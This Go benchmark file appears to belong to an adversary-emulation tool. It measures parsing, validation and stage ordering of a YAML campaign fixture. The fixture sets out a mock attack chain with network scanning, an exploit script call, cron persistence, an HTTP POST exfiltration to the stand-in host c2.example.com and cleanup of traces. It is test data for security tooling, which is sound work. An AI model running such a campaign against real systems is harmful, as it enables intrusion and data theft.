// Copyright (c) 2024-2026 ThreatEcho. All rights reserved.
// SPDX-License-Identifier: AGPL-3.0-only
// https://threatecho.com

package campaign

import (
	"testing"

	"gopkg.in/yaml.v3"
)

var benchCampaignYAML = []byte(`api_version: v1
kind: Campaign
meta:
  name: bench-campaign
  description: "Benchmark campaign with realistic structure"
  author: bench
  version: "1.0"
  tags: [benchmark, test, performance]
  mitre:
    tactic: execution
    techniques: [T1059.001, T1059.003]
    platforms: [linux, windows]
stages:
  - id: recon
    name: "Network Discovery"
    tactic: discovery
    technique: T1046
    platform: [linux]
    execute:
      type: shell
      command: "nmap -sV 10.0.0.0/24"
    timeout: 30s
  - id: exploit
    name: "Exploit Service"
    tactic: execution
    technique: T1059.001
    depends_on: [recon]
    execute:
      type: shell
      command: "python3 exploit.py"
  - id: persist
    name: "Install Persistence"
    tactic: persistence
    technique: T1053.005
    depends_on: [exploit]
    on_success: exfil
    on_failure: cleanup
    execute:
      type: shell
      command: "crontab -l"
  - id: exfil
    name: "Exfiltrate Data"
    tactic: exfiltration
    technique: T1041
    depends_on: [persist]
    execute:
      type: http
      method: POST
      url: "https://c2.example.com/data"
  - id: cleanup
    name: "Clean Traces"
    tactic: defense-evasion
    technique: T1070.004
    depends_on: [exploit]
    execute:
      type: shell
      command: "rm -f /tmp/payload"
`)

func BenchmarkCampaignYAMLParse(b *testing.B) {
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		var c Campaign
		if err := yaml.Unmarshal(benchCampaignYAML, &c); err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkCampaignValidate(b *testing.B) {
	var c Campaign
	if err := yaml.Unmarshal(benchCampaignYAML, &c); err != nil {
		b.Fatal(err)
	}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = Validate(&c)
	}
}

func BenchmarkResolveOrder(b *testing.B) {
	var c Campaign
	if err := yaml.Unmarshal(benchCampaignYAML, &c); err != nil {
		b.Fatal(err)
	}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = ResolveOrder(c.Stages)
	}
}
